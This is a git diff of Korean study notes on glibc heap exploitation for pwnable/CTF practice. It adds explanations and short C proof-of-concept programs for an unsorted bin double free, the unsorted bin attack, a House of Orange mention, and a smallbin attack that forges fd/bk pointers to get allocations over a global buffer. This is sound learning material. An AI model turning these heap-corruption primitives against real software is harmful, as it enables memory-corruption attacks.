@@ -183,7 +183,8 @@ pwnable_tech
   - 그 외에는 _int_free()호출 -> 내부에서 size와 address 검사
   - _int_free에서 arena의 mutext필드에 따라 mutex_lock호출 (mutext_lock는 vtable로 존재하는 걸로 추정)
   - free될 메모리 사이즈가 fastbin size면 fastbin으로 그 이외에는 unsorted bin으로!
-  - 각 bin별로 double free 체크 루틴 존재 -> fastbin만 쓸모 있음
+  - 각 bin별로 double free 체크 루틴 존재
+  - fastbin만 쓸모 있음
   ```c
   // 가장 최근에 free된 chunk(fastbin[idx] head에 적힌 chunk)와 같지만 않으면 됨!
   do
@@ -196,6 +197,8 @@ pwnable_tech
 	    goto errout;
 	  }
   ```
+  - unsorted bin은 다음 chunk의 prev_inuse bit를 이용해서 double free check
+
   - 끝! free는 별거 없당
   
 
@@ -242,9 +245,33 @@ pwnable_tech
 
 ### 1.3.2 unsorted bin을 이용한 테크닉
   - libc leak
-    1. unsortedbin 특성상 fd와 bk가 unsorted bin을 가르킴(main_arena+88 == main_arena.top)
+    1. unsortedbin의 더블링크드 리스트 특성상 첫 청크와 끝 청크의 fd와 bk가 unsorted bin을 가르킴(main_arena+88 == main_arena.top)
     2. uninitialized pointer나 user after free와 같은 취약점을 통해 unsroted bin chunk로 부터 libc를 릭할수 있당.
   
+  - unsortedbin dobule free
+    1. unsorted bin의 경우 next chunk의 pre_inuse bit를 이용하여 dobule free check
+    2. next chunk의 prev_inuse bit를 수정할 수 있으면 dobule free 가능
+    3. dobule free를 통해 loop chain을 만들어서 계속 똑같은 공간을 할당받게 할 수 있음.
+    ```c
+    int main(){
+
+    void *a = malloc(0x100);
+    void *b = malloc(0x30);
+    free(a);
+
+    // a의 다음 chunk인 b의 prev_inuse bit 수정
+    *(long *)(b-0x8) = 0x41;
+
+    // dobule free를 통해 unsorted bin의 loop chain 생성
+    free(a);
+
+    // 이후 unsorted bin으로 부터 할당되는 공간은 모두 a와 같음
+    malloc(0x100);
+    malloc(0x100);
+    malloc(0x100);
+    }
+    ```
+
   - unsortedbin attack
     1. unsortedbin의 bk를 임의의 주소로 수정하고 unlink시킴으로서 임의의 주소에 main_arena+88 주소를 적을 수 있음
     2. input_size와 같은 global 변수를 덮을 수 있으면 overflow 유도가능
@@ -253,7 +280,6 @@ pwnable_tech
     ```c
     // unsorted bin attack으로 임의 주소 할당받기 poc
     #include<stdlib.h>
-
     char buf[0x100];
 
     int main(){
@@ -273,9 +299,46 @@ pwnable_tech
     // unsorted bin attack를 트리거하여 unsortedbin->bk를 buf의 주소로수정
     void *b = malloc(0x100);
 
-    // 그럼 unsroted bin에서 할당되는 녀석은? buf+0x10
+    // 이후 unsroted bin에서 할당되는 녀석은? buf+0x10
     void *b1 = malloc(0x100);
     }
     ```
-  - 
+    5. 4번 방법을 통하여 중요한 오브젝트를 내가 원하는곳에 할당할 수 있도록할 수 있음. -> 내가 수정할수 있는 곳이면? 오브젝트 컨트롤 가능!
+    6. unsorted bin attack으로 File stream pointer를 main_arena+88로 overwrite하여 House of Orange 트리거 가능.
 
+### 1.3.3 small bin을 이용한 테크닉
+  - libc leak
+    1. unsortedbin 처럼 더블링크드 리스트로 이루어져있어 main_arena.smallbin[idx] 주소를 릭할 수 있음.
+
+  - smallbin attack
+    1. chain의 끝 청크를 우선적으로 할당
+    2. 리스트 전체의 체인의 손상 여부를 검사하지 않음 
+    3. unlink를 이용하여 (smallbin[idx]->bk)->fd 부분과 (smallbin[idx]->bk)->fd->bk 부분만 원하는 주소로 수정해주면 임의의 위치 할당가능!
+    4. unlink시 size체크가 없어 쉽게 트리거 가능
+    5. but..! 3번 행위를 하기 위해서 최소 같은 idx의 smallbin chunk가 필요함.
+    ```c
+    char buf[0x100];
+    int main(){
+
+    void *a = malloc(0x100);
+    malloc(0x30);
+    void *a1 = malloc(0x100);
+    malloc(0x30);
+
+    free(a);
+    free(a1);
+
+    // unlink시 ((smallbin[idx]->bk)->bk)->fd == (smallbin[idx]->bk) 검사함
+    // 이부분을 수정하면 원하는 위치에 할당가능
+    void *b = malloc(0x300);
+    *(long *)(a+8) = (long )&buf;
+    *(long *)(a) = (long )&buf;
+    *(long *)(buf+0x10) = (long )a-0x10;
+    *(long *)(buf+0x18) = (long )a-0x10;
+
+    void *c = malloc(0x100);
+    // buf+16부분 할당됌.
+    void *c1 = malloc(0x100);
+    }
+    ```
+    
